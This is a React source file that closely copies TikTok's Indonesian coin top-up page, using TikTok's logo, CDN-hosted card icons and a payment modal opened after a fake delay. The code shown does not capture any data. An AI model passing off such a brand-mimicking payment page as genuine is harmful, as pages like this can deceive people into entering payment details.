import { useEffect, useRef, useState } from 'react';
import { avatar, tiktok } from './assets/';
import GridCoinVariant from './components/CoinVariant';
import SearchUser from './components/SearchUser';
import PaymentDetails from './components/SubmitModal';
import ButtonSubmit from './components/ButtonSubmit';
import usePriceFormat from './hooks/usePriceFormat';

export default function App() {

  const [user, setUser] = useState()
  const [price, setPrice] = useState(11900)
  const [coin, setCoin] = useState(70)
  const [submit, setSubmit] = useState()
  const submitModal = useRef()
  
  const handleSubmit = () => {
    setSubmit(true)
    setTimeout(() => {
      setSubmit(false)
      window.paymentDetails.showModal()
    }, 2000)
  }
  
  return (
    <div>
      <nav className="flex py-2 px-96 border-b-[1px] justify-between items-center">
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 118 42" width="118" height="42" alt="TikTok"><path fill="#25F4EE" d="M9.875 16.842v-1.119A8.836 8.836 0 008.7 15.64c-4.797-.006-8.7 3.9-8.7 8.707a8.706 8.706 0 003.718 7.135A8.675 8.675 0 011.38 25.55c0-4.737 3.794-8.598 8.495-8.707z"></path><path fill="#25F4EE" d="M10.086 29.526c2.14 0 3.89-1.707 3.967-3.83l.006-18.968h3.463a6.78 6.78 0 01-.11-1.202h-4.726l-.006 18.969a3.978 3.978 0 01-3.967 3.829 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 13.166v-1.055a6.506 6.506 0 01-3.583-1.068 6.571 6.571 0 003.583 2.123z"></path><path fill="#FE2C55" d="M20.409 11.043a6.54 6.54 0 01-1.616-4.315h-1.265a6.557 6.557 0 002.88 4.316zM8.706 20.365a3.98 3.98 0 00-3.973 3.976c0 1.528.869 2.858 2.134 3.523a3.936 3.936 0 01-.754-2.321 3.98 3.98 0 013.973-3.976c.409 0 .805.07 1.175.185v-4.833a8.837 8.837 0 00-1.175-.083c-.07 0-.134.006-.204.006v3.708a3.999 3.999 0 00-1.176-.185z"></path><path fill="#FE2C55" d="M23.992 13.166v3.676c-2.453 0-4.727-.786-6.58-2.116v9.621c0 4.802-3.902 8.714-8.706 8.714a8.669 8.669 0 01-4.988-1.579 8.69 8.69 0 006.368 2.781c4.797 0 8.707-3.906 8.707-8.714v-9.621a11.25 11.25 0 006.579 2.116v-4.73c-.48 0-.94-.052-1.38-.148z"></path><path fill="black" d="M17.413 24.348v-9.622a11.251 11.251 0 006.58 2.116v-3.676a6.571 6.571 0 01-3.584-2.123 6.61 6.61 0 01-2.888-4.315H14.06l-.006 18.968a3.978 3.978 0 01-3.967 3.83A3.99 3.99 0 016.86 27.87a3.991 3.991 0 01-2.133-3.523A3.98 3.98 0 018.7 20.372c.409 0 .805.07 1.175.185v-3.708c-4.701.103-8.495 3.964-8.495 8.701 0 2.29.888 4.373 2.338 5.933a8.669 8.669 0 004.988 1.58c4.798 0 8.707-3.913 8.707-8.714zM30.048 13.179h14.774l-1.354 4.232h-3.832v15.644h-4.778V17.41l-4.804.006-.006-4.238zM69.032 13.179h15.12l-1.355 4.232h-4.17v15.644h-4.785V17.41l-4.804.006-.006-4.238zM45.73 19.502h4.733v13.553h-4.708l-.026-13.553zM52.347 13.128h4.733v9.257l4.689-4.61h5.646l-5.934 5.76 6.644 9.52h-5.213l-4.433-6.598-1.405 1.362v5.236H52.34V13.128h.006zM102.49 13.128h4.734v9.257l4.688-4.61h5.647l-5.934 5.76 6.643 9.52h-5.206l-4.433-6.598-1.405 1.362v5.236h-4.734V13.128zM48.093 17.954a2.384 2.384 0 002.382-2.384 2.384 2.384 0 10-2.382 2.384z"></path><path fill="#25F4EE" d="M83.544 24.942a8.112 8.112 0 017.474-8.087 8.748 8.748 0 00-.709-.026c-4.478 0-8.106 3.631-8.106 8.113 0 4.482 3.628 8.113 8.106 8.113.21 0 .498-.013.71-.026-4.178-.326-7.475-3.823-7.475-8.087z"></path><path fill="#FE2C55" d="M92.858 16.83c-.217 0-.505.012-.716.025a8.111 8.111 0 017.468 8.087 8.112 8.112 0 01-7.468 8.087c.211.02.499.026.716.026 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"></path><path fill="black" d="M91.58 28.887a3.94 3.94 0 01-3.94-3.945 3.94 3.94 0 117.882 0c0 2.18-1.77 3.945-3.942 3.945zm0-12.058c-4.477 0-8.106 3.631-8.106 8.113 0 4.482 3.629 8.113 8.106 8.113 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"></path></svg>
        </div>
          <div className="bg-zinc-100 px-5 rounded-full flex" >
            <input className="bg-zinc-100 py-2.5 focus:outline-none placeholder-zinc-400" placeholder="Cari" />
            <button className="border-l-zinc-300 border-l-[1px] my-2 pl-3">
              <div class="tiktok-17iic05-DivSearchIconContainer e14ntknm8"><svg width="24" data-e2e="" height="24" viewBox="0 0 48 48" fill="rgba(22, 24, 35, .34)" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M22 10C15.3726 10 10 15.3726 10 22C10 28.6274 15.3726 34 22 34C28.6274 34 34 28.6274 34 22C34 15.3726 28.6274 10 22 10ZM6 22C6 13.1634 13.1634 6 22 6C30.8366 6 38 13.1634 38 22C38 25.6974 36.7458 29.1019 34.6397 31.8113L43.3809 40.5565C43.7712 40.947 43.7712 41.5801 43.3807 41.9705L41.9665 43.3847C41.5759 43.7753 40.9426 43.7752 40.5521 43.3846L31.8113 34.6397C29.1019 36.7458 25.6974 38 22 38C13.1634 38 6 30.8366 6 22Z"></path></svg></div>
            </button>
          </div>
        <div className="flex gap-x-5">
          <a className="flex items-center" href="#">
            <div className="flex text-lg font-semibold px-3 py-[3px] border-[1px] border-zinc-300">
            <svg class="mt-1 mx-1" width="1.1em" data-e2e="" height="1.1em" viewBox="0 0 16 16" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M8 2.5C7.58579 2.5 7.25 2.83579 7.25 3.25V7.25H3.25C2.83579 7.25 2.5 7.58579 2.5 8C2.5 8.41421 2.83579 8.75 3.25 8.75H7.25V12.75C7.25 13.1642 7.58579 13.5 8 13.5C8.41421 13.5 8.75 13.1642 8.75 12.75V8.75H12.75C13.1642 8.75 13.5 8.41421 13.5 8C13.5 7.58579 13.1642 7.25 12.75 7.25H8.75V3.25C8.75 2.83579 8.41421 2.5 8 2.5Z"></path></svg>
              <span>Unggah </span>
            </div>
          </a>
          <a className="flex items-center" href="#">
            <svg width="1.6em" data-e2e="" height="1.6em" viewBox="0 0 48 48" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2.17877 7.17357C2.50304 6.45894 3.21528 6 4.00003 6H44C44.713 6 45.372 6.37952 45.7299 6.99615C46.0877 7.61278 46.0902 8.37327 45.7365 8.99228L25.7365 43.9923C25.3423 44.6821 24.5772 45.0732 23.7872 44.9886C22.9972 44.9041 22.3321 44.3599 22.0929 43.6023L16.219 25.0017L2.49488 9.31701C1.97811 8.72642 1.85449 7.88819 2.17877 7.17357ZM20.377 24.8856L24.531 38.0397L40.5537 10H8.40757L18.3918 21.4106L30.1002 14.2054C30.5705 13.9159 31.1865 14.0626 31.4759 14.533L32.5241 16.2363C32.8136 16.7066 32.6669 17.3226 32.1966 17.612L20.377 24.8856Z"></path></svg>
          </a>
          <a className="flex items-center" href="#">
            <svg class="tiktok-1g0p6jv-StyledInboxIcon e18kkhh41" width="32" data-e2e="" height="32" viewBox="0 0 32 32" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M24.0362 21.3333H18.5243L15.9983 24.4208L13.4721 21.3333H7.96047L7.99557 8H24.0009L24.0362 21.3333ZM24.3705 23.3333H19.4721L17.2883 26.0026C16.6215 26.8176 15.3753 26.8176 14.7084 26.0026L12.5243 23.3333H7.62626C6.70407 23.3333 5.95717 22.5845 5.9596 21.6623L5.99646 7.66228C5.99887 6.74352 6.74435 6 7.66312 6H24.3333C25.2521 6 25.9975 6.7435 26 7.66224L26.0371 21.6622C26.0396 22.5844 25.2927 23.3333 24.3705 23.3333ZM12.6647 14C12.2965 14 11.998 14.2985 11.998 14.6667V15.3333C11.998 15.7015 12.2965 16 12.6647 16H19.3313C19.6995 16 19.998 15.7015 19.998 15.3333V14.6667C19.998 14.2985 19.6995 14 19.3313 14H12.6647Z"></path></svg>
          </a>
          <a className="flex items-center" href="#">
          <div className="avatar">
            <div className="w-9 rounded-full">
              <img src={avatar} />
            </div>
          </div>
          </a>
        </div>
      </nav>
      <main className='px-96 mt-16'>
        <div className='flex justify-between'>
          <h1 className='font-bold text-2xl'>Kirim Koin</h1>
          <a href='' className='font-bold text-lg'>Lihat riwayat transaksi</a>
        </div>

        <SearchUser setUser={e => setUser(e)} />

        <div className='mt-6'>
          <h4 className='font-bold text-lg mb-3'>Isi Ulang</h4>
          
          <GridCoinVariant isSubmit={submit} setCoin={e => setCoin(e)} setPrice={e => setPrice(e)} />

          <div>
            <ul class="flex items-center mt-2">
              <li><span data-e2e="wallet-title-payment-method" class="mr-2 font-semibold">Metode pembayaran</span></li>
              <li><img src="https://lf16-co.g-p-static.com/obj/pipo-sgcompliance/sky/visa_light_c558fb.svg" data-e2e="wallet-payment-icon-VISA" alt="Visa" class="w-[22px] h-[22px] mt-1" /></li>
              <li><img src="https://lf16-co.g-p-static.com/obj/pipo-sgcompliance/sky/mastercard-gray-update_7b3ceb.svg" data-e2e="wallet-payment-icon-MASTER" alt="Mastercard"  class="w-[22px] h-[22px] mt-1" /></li>
              <li><img src="https://lf16-co.g-p-static.com/obj/pipo-sg/sky/card_american_express_v1_429e0f.svg" data-e2e="wallet-payment-icon-AMEX" alt="American Express"  class="w-[22px] h-[22px] mt-1" /></li>
              <li><img src="https://lf16-co.g-p-static.com/obj/pipo-sg/sky/diners_a3de24.svg" data-e2e="wallet-payment-icon-DINERS" alt="DINERS"  class="w-[22px] h-[22px] mt-1" /></li>
              <li><img src="https://lf16-co.g-p-static.com/obj/pipo-sg/sky/discover_5ec158.svg" data-e2e="wallet-payment-icon-DISCOVER" alt="Discover"  class="w-[22px] h-[22px] mt-1" /></li>
            </ul>
          </div>
          <div className='mt-2'>
            <span className='mr-4 text-lg'>Total</span>
            <span className='font-semibold text-lg'>{usePriceFormat(price)}</span>
          </div>
          <div className='mt-4'>
            <ButtonSubmit onClick={(e) => handleSubmit()} submit={submit}>Isi ulang</ButtonSubmit>
          </div>
        </div>
      </main>

      <PaymentDetails user={user} coin={coin} price={price} submit={submit} />
      

    </div>
    
  )
}